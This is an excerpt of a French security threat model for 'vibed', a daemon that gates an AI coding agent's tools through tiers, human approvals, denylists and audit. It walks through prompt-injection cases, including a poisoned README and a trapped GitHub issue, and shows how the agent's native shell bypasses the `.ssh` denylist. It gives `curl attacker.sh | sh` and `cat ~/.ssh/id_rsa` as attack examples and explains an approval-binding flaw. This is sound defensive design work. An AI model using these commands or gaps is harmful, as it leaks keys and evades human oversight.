...
1. **Tiers de politique — sur la surface `vibed`, et elle seule.** L'écriture de `authorized_keys` tombe dans les chemins refusés de `fs.write` — à la fois par la politique ([../security/policy.d/default.toml](../security/policy.d/default.toml)) et par la denylist intégrée au code de `vibed` (`**/.ssh/**`, etc.) — et l'exécution réseau arbitraire n'est pas un outil T0/T1. La demande est refusée par `vibed` avant toute exécution.

   ⚠️ **Portée réelle, à ne pas surestimer** (corrigé le 2026-07-15). Cette mitigation raisonne sur la surface d'outils de **`vibed`**. Or l'agent réel en a une **plus large** : Claude Code en terminal garde ses `Read`/`Write`/`Edit`/`Bash` **natifs** (`DECISIONS.md` ADR-015 : *« décision Zed-only, le terminal garde ses outils »*), et `vibed` n'en voit rien. Donc `vibeos:fs.read ~/.ssh/id_rsa` est refusé, mais **`Bash("cat ~/.ssh/id_rsa")` passe**. La denylist `**/.ssh/**` protège `fs.*`, pas le shell de l'agent. Le scénario S1 ci-dessus — un README empoisonné qui dit *« add an SSH key to authorized_keys »* — n'est **pas** bloqué par cette mitigation si l'agent utilise son `Bash` natif.
   Ce qui **tient** dans ce scénario : l'agent n'est pas root (`/usr`, `/etc`, `/boot` en lecture seule), donc `curl attacker.sh | sh` ne peut pas modifier le système ; et sous l'unité `vibeos-agent@%i`, `IPAddressDeny=any` + allowlist bloque l'exfiltration — **mais cette unité ne couvre que l'agent supervisé, pas un `claude` lancé à la main dans un terminal**. Les mitigations 2 (approbation T2+) et 3 (audit) ne couvrent, elles aussi, que ce qui transite par `vibed`.
   Fermer l'écart est une **décision produit ouverte** (`permissions.deny` s'appliquerait via des settings Claude Code partagés, donc au terminal aussi) — voir `ARCHITECTURE.md` §8 invariant n°1.
2. **Approbation humaine T2+** : toute action de modification système (installation de paquet, redémarrage de service) exige une confirmation humaine hors bande (jamais via le canal de l'agent, qui est contaminé). L'humain voit l'action *réelle*, pas la justification du modèle.
   **Ce que « l'action réelle » exige concrètement (durci le 2026-07-15).** La demande d'approbation ne montre à l'opérateur que `(outil, cible)` — jamais les arguments — et le **grant à usage unique est keyé sur cette même `cible`** (`approval::check_and_consume_grant` la compare à l'identique), tandis que l'exécution relit les arguments **bruts**. La cible doit donc nommer **ce sur quoi l'outil agit vraiment**, sinon une approbation en autorise une autre. Elle était dérivée du « premier non-nul parmi (chemin, unité, nom de paquet) » pour **tous** les outils, alors que `path` et `unit` sont lus sur les arguments de **n'importe quel** appel — ce qui cassait la liaison **dans les deux sens** : un `svc.restart {"unit":"x","path":"/etc/nginx/nginx.conf"}` faisait gagner le chemin, donc l'opérateur approuvait « redémarrer » un **fichier de configuration** d'apparence plausible, le grant était keyé sur ce chemin, et le même grant autorisait ensuite le redémarrage de **n'importe quelle autre unité non-denylistée** (l'unité n'est jamais comparée au grant) ; symétriquement un `pkg.install {"name":"evil","unit":"vim"}` faisait gagner l'unité, et un grant approuvé pour `vim` matchait un appel installant autre chose. La cible est désormais dérivée **par outil**, depuis l'argument que cet outil utilise réellement (`fs.*` → chemin, `svc.*`/`log.read` → unité, `pkg.install` → nom ; **rien** pour les outils sans sujet nommable — un `path`/`unit` glissé dans leurs arguments est une fiction que rien ne lit et qui n'a pas à entrer dans l'audit). Portée : exploitable **uniquement** avec une approbation humaine obtenue sur une demande d'apparence plausible (le plancher T2/T3 n'a jamais été franchi sans humain) — mais montrer à l'opérateur autre chose que l'action réelle vide précisément cette mitigation de son sens.
...
**Résiduel accepté n°2 — navigateur piloté par l'IA (décision opérateur, 2026-07-15, [ADR-017](DECISIONS.md)).** La capacité `browser.*` (à implémenter) est gouvernée par `vibed` — allowlist de domaines évaluée **avant** le plancher de tier, egress dérivé de cette allowlist, tout audité. Mais **deux paramètres tranchés par l'opérateur se combinent en un risque réel**, et il est consigné ici plutôt que découvert plus tard : le navigateur garde des **sessions authentifiées persistantes**, et les **clics/saisies sont T1** (seule la soumission de formulaire est T2). **Conséquence** : une page piégée sur un domaine **allowlisté** peut faire agir l'agent **en votre nom, sans approbation**. Ce n'est pas théorique — l'allowlist contiendra GitHub (l'agent doit y lire issues et docs), et les *« issues GitHub »* sont **littéralement** citées comme vecteur M2 ci-dessus : une issue piégée peut viser « Settings → Supprimer le dépôt », et *Supprimer* est un **bouton**, donc T1. L'alternative *« le tier suit l'identité, pas l'action »* (toute interaction sur un domaine où le profil est connecté → T2) a été **proposée et écartée** au profit de la fluidité. **Ce que ça ne lève PAS** : rien du plancher système — pas d'installation de paquet, pas de redémarrage de service, pas d'écriture hors du home de l'appelant sans approbation. Le risque est **circonscrit aux actions web menées avec l'identité de l'opérateur, sur les domaines qu'il a lui-même allowlistés**. Révisable en basculant les clics en T2, ou en adoptant la règle écartée.
...
| S1 | **`svc.restart` (T2) — backend réel livré** : n'est atteint que sur le chemin *Allow*, c.-à-d. **après** consommation d'un grant one-shot `(svc.restart, unité, uid)` — jamais d'auto-approbation, le plancher T2 vit entièrement dans le dispatcheur en amont. **Allowlist de CIBLES** (`[rule.services].denied` de la politique livrée, évaluée AVANT le floor T2) : les unités d'**accès** (`sshd`, `NetworkManager`/`networkd`, `display-manager`/`sddm`, `logind`, `user@*` — le manager de session de l'humain), d'**audit/log** (`journald`, `auditd`), d'**approbation** (`vibed`, `vibeos-agent@*`, `polkit`) et le **bus système** (`dbus-broker`/`dbus`/`dbus.socket`) sont **refusées d'office** (`Deny`, pas `RequireApproval`) — un agent ne peut même pas les mettre en file d'approbation. **Nom d'unité canonicalisé AVANT l'évaluation** (`svc.restart {"unit":"sshd"}` → `sshd.service`) dans `handle_tools_call`, sinon un agent contournerait la deny-list en omettant le suffixe `.service` (revue adversariale 2026-07-14). Tests : `shipped_policy_denies_restart_of_critical_units_before_approval` + `svc_restart_bare_critical_unit_is_denied_not_merely_pending` (e2e socket, nom nu). Exécution : nom d'unité **validé** (anti-injection option/chemin, `--` en clôture), `systemctl` par **chemin absolu** + environnement vidé, borné par le timeout de job systemd, **relecture d'état** pour prouver le redémarrage. Chaîne « agent demande → refus T2 → `vibectl approve` → grant consommé → unité redémarrée → audit `started_approved(by_uid=…)` » couverte e2e par-dessus le socket ; qui approuve survit **dans l'audit** (le grant est supprimé à l'usage). `pkg.install` reste un stub jusqu'au backend rpm-ostree/bootc | Phase 2.5 ✅ (svc.restart) / Phase 4 (pkg.install + UI) |
...
| S1/S2 | **Durcissements fs (revue adversariale 2026-07-14)** : (1) **anti-DoS FIFO** — `fs.read` vérifie le type de fichier **avant** l'`open()` (un FIFO sans writer bloquait le thread `spawn_blocking` → épuisement du pool = déni de service cross-tenant) + `O_NONBLOCK` en défense ; (2) **défense hardlink cross-owner** — pour une lecture confinée au home de l'appelant, l'inode ouvert doit être **owned par l'appelant** (`fstat st_uid`, un hardlink vers l'inode d'un autre user/root est refusé même sans `fs.protected_hardlinks`) ; les lectures system (owned root) en sont exemptées ; (3) **home `/`** résolu → refus (sinon `is_within` rendait le confinement inopérant). Résidu documenté : TOCTOU de swap d'un parent **intermédiaire** pour `fs.write` (fermeture = `openat2(RESOLVE_NO_SYMLINKS)`, Phase 3) ; hardlink d'un secret du **propre** home (l'agent y a déjà accès via son uid). Tests : cas FIFO/répertoire/device dans `fs_read_rejects_non_regular_files` | Phase 2.5 ✅ |
| S2 | **`agents.list` (T0) confiné à l'uid appelant** : roster dérivé de l'audit, **filtré sur l'uid SO_PEERCRED de l'appelant** + processus appelant exclu — l'agent de A ne voit **jamais** l'activité de B (même discipline que `fs.read` ; un uid inconnu ⇒ roster vide, fail-closed). Sortie bornée (fenêtre temporelle + queue d'audit bornées, une entrée par pid), rate-limité par uid. Test `agents_list_confines_to_caller_uid_and_excludes_self` | Phase 2.5 ✅ |
| S2 | **`log.read` (T0, sensible à l'exfiltration) — livré (ADR-011)** : lecture du journal d'**UNE unité allowlistée uniquement** (`[rule.services].allowed` de la politique, défaut refus, évaluée **AVANT** le plancher de tier — une unité hors-liste est `Deny`, jamais l'approbation), jamais un `journalctl` générique ni le journal système complet. **Sortie bornée** (≤ 200 lignes + 64 Kio, garde la queue). **Rédaction best-effort** (`*_KEY=`/`Bearer`/`password=`/`AWS_`/`PRIVATE KEY` + jetons à forte entropie) — défense en profondeur, **jamais une garantie** : le vrai contrôle est l'allowlist + la borne + l'audit. **Aucun filtre libre** (pas de grep/regex fourni par l'agent). Nom d'unité validé + canonicalisé avant décision, `journalctl` chemin absolu + env vidé. Allowlist livrée étroite (`vibed.service`, `vibeos-agent@*.service`), à garder libre d'unités journalisant du sensible. Tests : unité hors-liste refusée avant approbation, sortie bornée + rédaction | Phase 2 ✅ |
...
| S2 | **Denylist étendue à la mémoire noyau + aux runtime par-user (revue adversariale 2026-07-15)** : vibed lit en ROOT et `/proc`/`/run`/`/etc` sont des « system read prefixes » — la denylist ne couvrait ni la mémoire noyau ni les runtime `0700` d'autres utilisateurs. Ajoutés : `/proc/kcore`+`/proc/kallsyms` (image mémoire noyau + adresses de symboles → défaite KASLR), `/proc/*/mem`+`/proc/*/pagemap`, `/run/user/**`+`/run/secrets/**` (lecture cross-user), et les secrets `/etc` non-standard (`krb5.keytab`, `sssd/`, `ipsec`, clés PKI privées — les certs publics restent lisibles). Synchronisé au code (`BUILTIN_DENY_ALWAYS`) + au miroir de politique + au commentaire. Test `builtin_denylist_covers_kernel_memory_and_runtime_dirs` | Phase 2.5 ✅ |
...
| S2 | `os.status` (T0) : état système en lecture seule — champs choisis (versions, uptime, mode ADR-027), aucun contenu de fichier ni secret ; sortie bornée, auditée | Phase 2 ✅ |
| S2 | `memory.query` (T0) : lecture du store mémoire **confinée au store** (marche sans suivre les symlinks, `O_NOFOLLOW` anti-TOCTOU, scan/snippets bornés) ; scopes explicites (`identity`/`hardware`/`personality`/`user`/`projects`/`journal`/`knowledge`) — jamais un chemin libre | Phase 2 ✅ |
| S2 | `agent.thinking` + `agent.sessions` (T0) : relecture du raisonnement capté — `session_id` validé (charset, anti-traversal), listing plafonné, lecture bornée ; le store vit sous la mémoire (possédé par l'utilisateur) | Phase 2.5 ✅ |
| S2 | `agent.activity` (T0) **confiné à l'uid appelant** (SO_PEERCRED, refus compris) : le citoyen relit SES actes, jamais ceux d'un autre uid ; fenêtre + sortie bornées (ADR-026) | Phase 2.5 ✅ |
| S2 | `user.model` (T0) **confiné à l'uid appelant** : modèle DÉRIVÉ de données déjà gouvernées (audit du même uid + mémoire user + journal), **aucune capture nouvelle** (jamais frappes/shell), fenêtre effective annoncée honnêtement (`window_effective_seconds`) ; uid inconnu ⇒ modèle vide, fail-closed (ADR-028) | Phase 2.5 ✅ |
| S2 | `agent.identity` (T0) : connaissance de soi du citoyen (nom/archétype/ton/traits, ADR-029) — lit la personnalité **PUBLIQUE** (`personality.toml`) **uniquement**, jamais `identity.toml` : la struct `Personality` n'a **aucun** champ `hostname`/`machine_id`, donc ils ne peuvent **structurellement pas** fuiter (test de non-régression qui les glisse dans le fichier et vérifie leur absence). Fail-safe (absent/illisible/malformé/sans nom ⇒ `{born:false}`, jamais d'erreur ni de panic) ; traits bornés à leur plage documentée. `personality.toml` reste sur la **denylist en écriture** (un agent ne réécrit pas sa propre âme) | Phase 2.5 ✅ |
| S1 | `policy.check` (T0) : classification HYPOTHÉTIQUE d'un appel (dry-run du moteur réel) — ne décide rien, n'exécute rien ; le verdict réel est re-décidé à l'exécution | Phase 2 ✅ |
| S1 | `policy.capabilities` (T0) : manifeste DÉRIVÉ de la politique chargée (ADR-023) — expose ce que la politique permet déjà de savoir, jamais un canal pour l'élargir | Phase 2.5 ✅ |
| S1 | `sandbox.probe` (T1) : sonde comportementale du bac à sable ADR-019 — unité transitoire durcie + helper bas-privilège `vibed-tool`, verdict jugé sur comportement observé ; la preuve on-target reste machine-gated | Phase 2.5 ✅ (mécanisme) |
| S2/S3 | `deploy.plan` (T2) : lecture d'état de déploiement **refusée par défaut** (aucune règle `[rule.deploy]` livrée — fail-closed tant que l'opérateur n'allowliste pas `(provider, target)`) ; le jeton fournisseur reste scellé, jamais lisible par l'agent (ADR-021) | Phase 2.5 ✅ (refus par défaut) |
| S1/S2 | `browser.run` (ADR-022) : lot navigateur gouverné — `steps` (navigate/read/screenshot/click/fill/submit) pilotés par **un seul Chromium headless éphémère, sans identifiants** ; **tier = MAX des verbes** du lot (`submit` escalade tout le lot en T2/approbation), egress confiné aux domaines `navigate` approuvés, `submit` en dernier (anti double-POST) | Phase 2.5 ✅ |
...
| S3 Supply chain | Signature cosign (livrée, CI) ; **vérification client livrée STAGED** — `policy-strict.json` (sigstore keyless, ancres épinglées) + preuve de rejet skopeo en CI ; activation = machine-gated (c/image ne matche pas encore les SAN URI, l'image authentique serait rejetée) | Phase 1 ✅ / Phase 4 (activation) |
